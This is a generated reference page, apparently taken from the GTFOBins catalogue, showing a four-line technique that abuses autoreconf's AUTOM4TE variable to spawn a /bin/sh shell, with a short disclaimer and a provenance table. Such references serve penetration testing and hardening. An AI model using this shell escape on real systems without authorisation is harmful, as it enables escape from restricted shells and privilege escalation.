---
parsed_by: focuslocust
source: commands
type: generated
---
# autoreconf Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## autoreconf

Tool page: [autoreconf](../../tools/linux/autoreconf.md)

### shell

```text
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoreconf` |
| Evidence | Function example preserved from source parser. |
